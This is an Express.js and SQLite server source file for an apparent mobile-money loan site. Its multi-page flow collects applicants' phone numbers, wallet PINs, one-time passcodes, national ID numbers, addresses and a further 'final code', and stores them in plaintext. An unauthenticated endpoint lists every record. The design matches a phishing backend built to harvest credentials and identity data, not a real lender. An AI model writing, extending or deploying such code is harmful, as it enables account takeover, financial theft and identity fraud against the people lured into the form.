const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Database setup
let db = null;

async function initDatabase() {
    try {
        db = await open({
            filename: './database/loans.db',
            driver: sqlite3.Database
        });

        // Create tables
        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE,
                phone TEXT,
                pin TEXT,
                network TEXT,
                amount INTEGER,
                duration INTEGER,
                monthly_payment INTEGER,
                total_payment INTEGER,
                interest INTEGER,
                otp_code TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT,
                full_name TEXT,
                national_id TEXT,
                date_of_birth TEXT,
                address TEXT,
                occupation TEXT,
                income TEXT,
                final_code TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (loan_id) REFERENCES loans(loan_id)
            );
        `);

        console.log('✅ Database initialized');
        return true;
    } catch (error) {
        console.error('❌ Database error:', error);
        return false;
    }
}

// Generate unique loan ID
function generateLoanId() {
    const timestamp = Date.now().toString(36);
    const random = Math.random().toString(36).substring(2, 8);
    return `MUG${timestamp}${random}`.toUpperCase();
}

// ========== API ROUTES ==========

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Save loan application (from verify.html)
app.post('/api/save-loan', async (req, res) => {
    try {
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        
        const loanId = generateLoanId();
        
        await db.run(
            `INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [loanId, phone, pin, network, amount, duration, monthly, total, interest, 'pending']
        );
        
        res.json({
            success: true,
            loanId: loanId,
            message: 'Loan application saved'
        });
        
    } catch (error) {
        console.error('Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save OTP (from otp.html)
app.post('/api/save-otp', async (req, res) => {
    try {
        const { loanId, otp } = req.body;
        
        await db.run(
            `UPDATE loans SET otp_code = ?, status = ? WHERE loan_id = ?`,
            [otp, 'otp_verified', loanId]
        );
        
        res.json({
            success: true,
            message: 'OTP saved successfully'
        });
        
    } catch (error) {
        console.error('Save OTP error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Save final verification (from final-verify.html)
app.post('/api/save-final', async (req, res) => {
    try {
        const { loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode } = req.body;
        
        await db.run(
            `INSERT INTO users (loan_id, full_name, national_id, date_of_birth, address, occupation, income, final_code)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
            [loanId, fullName, nationalId, dateOfBirth, address, occupation, income, finalCode]
        );
        
        await db.run(
            `UPDATE loans SET status = ? WHERE loan_id = ?`,
            ['completed', loanId]
        );
        
        res.json({
            success: true,
            message: 'Final verification saved'
        });
        
    } catch (error) {
        console.error('Save final error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get loan by ID
app.get('/api/loan/:loanId', async (req, res) => {
    try {
        const loan = await db.get(
            `SELECT * FROM loans WHERE loan_id = ?`,
            [req.params.loanId]
        );
        
        if (!loan) {
            return res.status(404).json({ success: false, error: 'Loan not found' });
        }
        
        res.json({ success: true, loan });
        
    } catch (error) {
        console.error('Get loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get all loans (admin)
app.get('/api/loans', async (req, res) => {
    try {
        const loans = await db.all(`SELECT * FROM loans ORDER BY created_at DESC`);
        res.json({ success: true, loans });
    } catch (error) {
        console.error('Get loans error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get user by loan ID
app.get('/api/user/:loanId', async (req, res) => {
    try {
        const user = await db.get(
            `SELECT * FROM users WHERE loan_id = ?`,
            [req.params.loanId]
        );
        
        res.json({ success: true, user });
        
    } catch (error) {
        console.error('Get user error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Serve HTML pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verify.html'));
});

app.get('/otp.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

app.get('/final-verify.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'final-verify.html'));
});

// Start server
async function startServer() {
    await initDatabase();
    
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Server running on port ${PORT}`);
        console.log(`📍 http://localhost:${PORT}`);
    });
}

startServer();
